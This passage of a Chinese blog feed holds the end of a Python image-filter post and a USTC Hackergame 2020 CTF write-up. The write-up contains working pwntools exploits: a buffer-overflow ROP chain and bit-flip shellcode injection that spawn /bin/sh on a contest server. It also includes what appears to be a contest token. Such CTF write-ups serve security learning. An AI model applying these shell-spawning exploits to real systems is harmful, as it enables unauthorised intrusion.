class="line">   nut = math.exp( - ( pow((qx - px), <span class="number">2</span>) + pow((qy - py), <span class="number">2</span>) ) ) <span class="comment">#分子</span></span><br><span class="line">   det = <span class="number">2</span> * pow(dr, <span class="number">2</span>) <span class="comment">#分母</span></span><br><span class="line">   result =  nut / det  </span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯频域核函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gzeta</span><span class="params">(guide_img, div, px, py, qx, qy, dzeta)</span>:</span></span><br><span class="line"></span><br><span class="line">   guide_img = guide_img </span><br><span class="line">   nut = math.exp( - ( pow( ( guide_img[px, py, div] - guide_img[qx, qy, div] ), <span class="number">2</span> ) ) ) <span class="comment">#分子</span></span><br><span class="line">   det = <span class="number">2</span> * pow(dzeta, <span class="number">2</span>)</span><br><span class="line">   result =  nut / det</span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解高斯空间域滤波，返回指定像素点(p)的输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GS</span><span class="params">(image, r, dr, px, py, div)</span>:</span></span><br><span class="line"></span><br><span class="line">   Upsilon = <span class="number">0</span> <span class="comment">#τ，归一化系数</span></span><br><span class="line">   output = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):<span class="comment"># 以p为中心的窗口半径为2r+1的区域</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):</span><br><span class="line">         Upsilon = Upsilon + gr(px, py, px + i, py + j, dr)</span><br><span class="line">         output = output + gr(px, py, px + i, py + j, dr) * image[px + i,py + j,div]</span><br><span class="line">   </span><br><span class="line">   output = output / Upsilon </span><br><span class="line">   <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解指定窗口(3*3)的中值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">medbox</span><span class="params">(img, x, y, div, length, width)</span>:</span></span><br><span class="line">   </span><br><span class="line">   nums = []</span><br><span class="line">   length = width = <span class="number">3</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(math.floor(length/<span class="number">2</span>), -math.floor(length/<span class="number">2</span>)<span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(math.floor(width/<span class="number">2</span>), -math.floor(width/<span class="number">2</span>)<span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">         nums.append( img[x+i, y+j, div])</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> np.median(nums)</span><br><span class="line"></span><br><span class="line"><span class="comment">#窗口感知的高斯引导滤波</span></span><br><span class="line"><span class="comment">#求解WGGF在每个像素点p的输出并返回</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WGGF</span><span class="params">(guide_img,source,r,dzeta,px,py,div, lam)</span>:</span></span><br><span class="line">   </span><br><span class="line">   guide_img = guide_img </span><br><span class="line">   source = source  </span><br><span class="line">   Upsilon = <span class="number">0</span> <span class="comment">#τ，归一化系数</span></span><br><span class="line">   output = <span class="number">0</span></span><br><span class="line">   flag = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):<span class="comment"># 以p为中心的窗口半径为2r+1的区域</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(r, -(r+<span class="number">1</span>), <span class="number">-1</span>):</span><br><span class="line">         temp = abs( guide_img[px + i, py + <span class="number">1</span>, div] - guide_img[px, py, div] )</span><br><span class="line">         <span class="keyword">if</span> temp &lt;= lam:</span><br><span class="line">               flag = flag + <span class="number">1</span></span><br><span class="line">               Upsilon = Upsilon + gzeta(guide_img, div, px, py, px+i, py+j, dzeta)</span><br><span class="line">               output = output + guide_img[px + i,py + j,div] * gzeta(guide_img, div, px, py, px+i, py+j, dzeta)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> flag == <span class="number">1</span> <span class="keyword">or</span> Upsilon == <span class="number">0</span>: <span class="comment">#不满足窗口感知的要求，返回3*3窗口中的像素点中值</span></span><br><span class="line">      output = medbox( source, px, py, j, <span class="number">3</span>, <span class="number">3</span> )</span><br><span class="line">   <span class="keyword">else</span>: <span class="comment">#满足条件</span></span><br><span class="line">      output = output / Upsilon </span><br><span class="line">   <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数，测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="comment">#读取图片</span></span><br><span class="line">   img = cv2.imread(<span class="string">'02.png'</span>, <span class="number">1</span>)</span><br><span class="line">   source = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)</span><br><span class="line">   source = source / <span class="number">255.0</span></span><br><span class="line">   guide_img = source</span><br><span class="line">   </span><br><span class="line">   print(<span class="number">1.666</span>)</span><br><span class="line">   <span class="comment">#求解高斯引导滤波</span></span><br><span class="line">   [m ,n, div] = np.shape(source)<span class="comment">#查看矩阵或者数组的维数。</span></span><br><span class="line">   r = <span class="number">5</span> <span class="comment">#窗口半径</span></span><br><span class="line">   dr = <span class="number">0.5</span> <span class="comment">#空域带宽</span></span><br><span class="line">   <span class="comment"># 高斯滤波</span></span><br><span class="line">   guide_img = cv2.GaussianBlur(source, (r,r), dr)</span><br><span class="line">               </span><br><span class="line">   </span><br><span class="line">   print(<span class="number">2.666</span>)</span><br><span class="line">   <span class="comment">#求解WGGF</span></span><br><span class="line">   target = guide_img</span><br><span class="line">   r = <span class="number">5</span> <span class="comment">#窗口半径</span></span><br><span class="line">   dzeta = <span class="number">0.1</span> <span class="comment">#频域带宽</span></span><br><span class="line">   lam = <span class="number">0.12</span> <span class="comment">#λ为一选定的阈值 </span></span><br><span class="line">   num = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> k <span class="keyword">in</span> range(div):</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">               <span class="keyword">if</span> i &lt;= r <span class="keyword">or</span> i &gt;= m - r <span class="keyword">or</span> j &lt;= r <span class="keyword">or</span> j &gt;= n - r: <span class="comment">#图片边界处理(引导像素)</span></span><br><span class="line">                  <span class="keyword">continue</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                  target[i, j, k] = WGGF(guide_img, source, r, dzeta, i, j, k, lam)</span><br><span class="line">               num = num + <span class="number">1</span></span><br><span class="line">               print(num)</span><br><span class="line">   print(<span class="number">3.666</span>)</span><br><span class="line">   <span class="comment">#显示图形</span></span><br><span class="line">   titles = [<span class="string">'Source Image'</span>, <span class="string">'WGGF Image'</span>]  </span><br><span class="line">   images = [source*<span class="number">255.0</span>, target*<span class="number">255.0</span>]  </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):  </span><br><span class="line">      plt.subplot(<span class="number">1</span>, <span class="number">2</span>, i+<span class="number">1</span>), plt.imshow(images[i], <span class="string">'gray'</span>)  </span><br><span class="line">      plt.title(titles[i])  </span><br><span class="line">      plt.xticks([]),plt.yticks([]) <span class="comment">#禁止输出坐标轴 </span></span><br><span class="line">   plt.show()  </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中科大2020年Hackergame WP</title>
      <link href="/2020/11/08/%E4%B8%AD%E7%A7%91%E5%A4%A72020%E5%B9%B4Hackergame-WP/"/>
      <url>/2020/11/08/%E4%B8%AD%E7%A7%91%E5%A4%A72020%E5%B9%B4Hackergame-WP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="01-签到"><a class="markdownIt-Anchor" href="#01-签到"></a> 01 签到</h1><ul><li>点击<code>提取</code>按钮，发现地址栏出现<code>.../?number=0</code></li><li>将<code>0</code>改为<code>1</code>便得flag</li></ul><h1 id="02-猫咪问答"><a class="markdownIt-Anchor" href="#02-猫咪问答"></a> 02 猫咪问答++</h1><p>百度一下即可；第一题较复杂，可枚举。</p><h1 id="03-2048"><a class="markdownIt-Anchor" href="#03-2048"></a> 03 2048</h1><ul><li><p>F12发现提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">   changelog:</span><br><span class="line">   - 2020/10/31 getflxg @ static/js/html_actuator.js</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></li><li><p>打开 <code>static/js/html_actuator.js</code> 文件，找到和游戏胜利有关的逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url;</span><br><span class="line">  <span class="keyword">if</span> (won) &#123;</span><br><span class="line">    url = <span class="string">"/getflxg?my_favorite_fruit="</span> + (<span class="string">'b'</span>+<span class="string">'a'</span>+ +<span class="string">'a'</span>+<span class="string">'a'</span>).toLowerCase();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url = <span class="string">"/getflxg?my_favorite_fruit="</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  request.open(<span class="string">'GET'</span>, url);</span><br></pre></td></tr></table></figure></li><li><p>打开 Chrome 浏览器的开发者工具，切换到 Console 标签页，执行一下 <code>('b'+'a'+ +'a'+'a').toLowerCase()</code>，得到正确的应该填入的值为 <code>banana</code>，访问 <code>/getflxg?my_favorite_fruit=banana</code>，则可以得到正确的 flag</p></li></ul><h1 id="04-一闪而过的-flag"><a class="markdownIt-Anchor" href="#04-一闪而过的-flag"></a> 04 一闪而过的 Flag</h1><p>cmd运行文件即可。</p><h1 id="05-从零开始的记账工具人"><a class="markdownIt-Anchor" href="#05-从零开始的记账工具人"></a> 05 从零开始的记账工具人</h1><ul><li><p>首先使用 Excel将下载的文件转换为 <code>.csv</code> 格式，即逗号分隔的文本</p></li><li><p>然后在 Python 中安装 cn2an 这个中文数字转换的库：<code>python3 -m pip install cn2an</code></p></li><li><p>然后使用 Python 程序处理这个文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn2an</span><br><span class="line">lines = open(<span class="string">'bills.csv'</span>).readlines()[<span class="number">1</span>:]</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    a, b = line.strip().split(<span class="string">','</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'元'</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">'元'</span>)</span><br><span class="line">        n += cn2an.cn2an(y, <span class="string">"smart"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'角'</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">'角'</span>)</span><br><span class="line">        n += cn2an.cn2an(y, <span class="string">"smart"</span>) / <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'分'</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">'分'</span>)</span><br><span class="line">        n += cn2an.cn2an(y, <span class="string">"smart"</span>) / <span class="number">100</span></span><br><span class="line">    s += n * int(b)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure></li><li><p>四舍五入得flag</p></li></ul><h1 id="06-超简单的世界模拟器"><a class="markdownIt-Anchor" href="#06-超简单的世界模拟器"></a> 06 超简单的世界模拟器</h1><h2 id="t1-蝴蝶效应"><a class="markdownIt-Anchor" href="#t1-蝴蝶效应"></a> T1 蝴蝶效应</h2><p>百度“生命游戏”了解一下，为了消除右上角的方块，只要放置一个水平移动的“太空船”即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000000</span><br><span class="line">001111000000000</span><br><span class="line">010001000000000</span><br><span class="line">000001000000000</span><br><span class="line">010010000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br></pre></td></tr></table></figure><h1 id="07-自复读的复读机"><a class="markdownIt-Anchor" href="#07-自复读的复读机"></a> 07 自复读的复读机</h1><h2 id="t1-反向复读"><a class="markdownIt-Anchor" href="#t1-反向复读"></a> T1 反向复读</h2><p>谷歌搜索“输出自己的程序”或者类似的词，可以查到这类程序叫做 Quine。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(s:=<span class="string">'print(("exec(s:=%r)"%s)[::-1],end="")'</span>)</span><br></pre></td></tr></table></figure><h2 id="t2-哈希复读"><a class="markdownIt-Anchor" href="#t2-哈希复读"></a> T2 哈希复读</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(s:=<span class="string">'print(__import__("hashlib").sha256(("exec(s:=%r)"%s).encode()).hexdigest(),end="")'</span>)</span><br></pre></td></tr></table></figure><h1 id="08-233-同学的字符串工具"><a class="markdownIt-Anchor" href="#08-233-同学的字符串工具"></a> 08 233 同学的字符串工具</h1><h2 id="t1-字符串大写工具"><a class="markdownIt-Anchor" href="#t1-字符串大写工具"></a> T1 字符串大写工具</h2><ul><li>以 “unicode uppercase collision” 为关键字搜索，链接：<a href="https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/" target="_blank" rel="noopener">https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/</a></li><li>找到一个连字（ligature）<code>ﬂ (0xFB02)</code></li><li>这个“字符”将在转换为大写时变成 <code>FL</code> 两个字符！因此，只需输入 <code>ﬂag</code> 即可得到 flag</li></ul><h1 id="09-233-同学的-docker"><a class="markdownIt-Anchor" href="#09-233-同学的-docker"></a> 09 233 同学的 Docker</h1><ul><li><p>参考博客：<a href="https://www.cnblogs.com/zejin2008/p/13460498.html" target="_blank" rel="noopener">https://www.cnblogs.com/zejin2008/p/13460498.html</a></p></li><li><p>拉取镜像 <code>docker pull 8b8d3c8324c7/stringtool</code></p></li><li><p>获取镜像历史构建信息，并标出层级：<code>sudo docker history 8b8d3c8324c7/stringtool</code><br><img src="https://s2.loli.net/2022/04/18/1Oa98HiNyLKCZng.jpg" width="1000" height="200" alt="图片名称" align="center" id="165"></p><p>由此我们知道flag.txt是在倒数第二层被删除的，所以我们只需要找到该层的文件即可</p></li><li><p>用docker inspect 获取该层的diff路径：<code>sudo docker inspect 8b8d3c8324c7/stringtool</code></p><img src="https://s2.loli.net/2022/04/18/VTShoi5FKIalYtb.jpg" width="1000" height="250" alt="图片名称" align="center" id="166"><p>UpperDir 为最上层，其它从LowerDir一层层往下数。</p></li><li><p>选定LowerDir中的第一个，<code>sudo tree /var/lib/docker/overlay2/05c27a902f648e2f88d79a2498d6043bd2b8d5b01f15eb0ed4848dfff4ddad37/diff</code></p><img src="https://s2.loli.net/2022/04/18/jVIEeAfXWsHyPmO.jpg" width="1000" height="150" alt="图片名称" align="center" id="167"></li><li><p>查看：<code>sudo cat /var/lib/docker/overlay2/05c27a902f648e2f88d79a2498d6043bd2b8d5b01f15eb0ed4848dfff4ddad37/diff/code/flag.txt</code></p></li></ul><h1 id="10-从零开始的-http-链接"><a class="markdownIt-Anchor" href="#10-从零开始的-http-链接"></a> 10 从零开始的 HTTP 链接</h1><ul><li>整个腾讯云免费服务器，最好是ubuntu，centos配置环境老是出问题</li><li><a href="https://github.com/vi/websocat/releases" target="_blank" rel="noopener">https://github.com/vi/websocat/releases</a> 下载 websocat_1.6.0_ssl1.0_amd64.deb</li><li>gdebi websocat_…_.deb  （根据提示install一下gdebi）</li><li>然后 websocat ws:// <a href="http://xxx.xxx.xxx.xxx:0/" target="_blank" rel="noopener">xxx.xxx.xxx.xxx:0/</a> shell</li></ul><h1 id="11-来自一教的图片"><a class="markdownIt-Anchor" href="#11-来自一教的图片"></a> 11 来自一教的图片</h1><ul><li><p>对图像二维傅里叶变换</p></li><li><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取图像</span></span><br><span class="line">img = []</span><br><span class="line">img = cv.imread(<span class="string">'4f_system_middle.bmp'</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># if img:</span></span><br><span class="line"><span class="comment">#     print(666)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#傅里叶变换</span></span><br><span class="line">f = np.fft.fft2(img)</span><br><span class="line">fshift = np.fft.fftshift(f)</span><br><span class="line">res = np.log(np.abs(fshift))</span><br><span class="line"></span><br><span class="line"><span class="comment">#傅里叶逆变换</span></span><br><span class="line">ishift = np.fft.ifftshift(fshift)</span><br><span class="line">iimg = np.fft.ifft2(ishift)</span><br><span class="line">iimg = np.abs(iimg)</span><br><span class="line"></span><br><span class="line"><span class="comment">#展示结果</span></span><br><span class="line">plt.subplot(<span class="number">131</span>), plt.imshow(img, <span class="string">'gray'</span>), plt.title(<span class="string">'Original Image'</span>)</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.subplot(<span class="number">132</span>), plt.imshow(res, <span class="string">'gray'</span>), plt.title(<span class="string">'Fourier Image'</span>)</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.subplot(<span class="number">133</span>), plt.imshow(iimg, <span class="string">'gray'</span>), plt.title(<span class="string">'Inverse Fourier Image'</span>)</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></li><li><p>将得到的照片调整即可得flag</p></li></ul><h1 id="12-生活在博弈树上"><a class="markdownIt-Anchor" href="#12-生活在博弈树上"></a> 12 生活在博弈树上</h1><h2 id="t1-始终热爱大地"><a class="markdownIt-Anchor" href="#t1-始终热爱大地"></a> T1 始终热爱大地</h2><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./tictactoe')</span></span><br><span class="line">sh = remote(<span class="string">'202.38.93.111'</span>,<span class="number">10141</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Please input your token: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'...'</span>)<span class="comment">#填写token</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your turn. Input like (x,y), such as (0,1): '</span>)</span><br><span class="line">sh.sendline(<span class="string">'(1,1)'</span>)</span><br><span class="line">payload =<span class="string">'(1,2)'</span>+<span class="string">'a'</span>*<span class="number">0x93</span> + p64(<span class="number">0x40255D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="t2-升上天空"><a class="markdownIt-Anchor" href="#t2-升上天空"></a> T2 升上天空</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./tictactoe')</span></span><br><span class="line">sh = remote(<span class="string">'202.38.93.111'</span>,<span class="number">10141</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x0000000000402bf4</span></span><br><span class="line">pop_rax = <span class="number">0x000000000043e52c</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004017b6</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000407228</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000043dbb5</span></span><br><span class="line">pop_rbx = <span class="number">0x000000000046cb55</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x4A8370</span></span><br><span class="line">gets_addr = <span class="number">0x409E00</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Please input your token: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'...'</span>)<span class="comment">#填写token</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your turn. Input like (x,y), such as (0,1): '</span>)</span><br><span class="line">sh.sendline(<span class="string">'(1,1)'</span>)</span><br><span class="line">payload =<span class="string">'(1,2)'</span>+<span class="string">'a'</span>*<span class="number">0x93</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="13-超精准的宇宙射线模拟器"><a class="markdownIt-Anchor" href="#13-超精准的宇宙射线模拟器"></a> 13 超精准的宇宙射线模拟器</h1><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./bitflip')</span></span><br><span class="line">sh = remote(<span class="string">'202.38.93.111'</span>,<span class="number">10231</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitxor</span><span class="params">(addr, num)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'You can flip only one bit in my memory. Where do you want to flip?\n'</span>)</span><br><span class="line">    sh.sendline(hex(addr)+<span class="string">' '</span> + str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onechange</span><span class="params">(byt, addr)</span>:</span></span><br><span class="line">    tmp = ord(byt)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> tmp&amp;<span class="number">1</span>:</span><br><span class="line">            bitxor(addr, i)</span><br><span class="line">        tmp = tmp&gt;&gt;<span class="number">1</span></span><br><span class="line">sh.recvuntil(<span class="string">'Please input your token: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'444:MEYCIQCOwUMnrz99os4e7j2RMF6lWimf1iMdPwIzb15HP3aUfAIhAOcW4gDJGOqi5sdtEF0zItE6w9K90u0XhOdsv7h/5OlF'</span>)        </span><br><span class="line"><span class="comment">#change exit to call _start</span></span><br><span class="line">bitxor(<span class="number">0x401296</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write shellcode to 0x401500</span></span><br><span class="line">shellcode = <span class="string">'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'</span></span><br><span class="line">shellcode_addr= <span class="number">0x401500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">    onechange(shellcode[i], shellcode_addr+i)</span><br><span class="line"><span class="comment">#change exit to jmp 0x401500</span></span><br><span class="line">a = <span class="number">0x90902f6d21c81b</span></span><br><span class="line">exit_addr = <span class="number">0x4010C4</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    tmp_a = a &amp; <span class="number">0xff</span></span><br><span class="line">    onechange(chr(tmp_a), exit_addr + j)</span><br><span class="line">    a = a&gt;&gt;<span class="number">8</span></span><br><span class="line">    j = j+<span class="number">1</span> </span><br><span class="line"><span class="comment">#change call _start to exit</span></span><br><span class="line">bitxor(<span class="number">0x401296</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="14-不经意传输"><a class="markdownIt-Anchor" href="#14-不经意传输"></a> 14 不经意传输</h1><h2 id="t1-解密消息"><a class="markdownIt-Anchor" href="#t1-解密消息"></a> T1 解密消息</h2><ul><li>v = x0</li><li>m0 = m1 = m0_</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF编码加密整理</title>
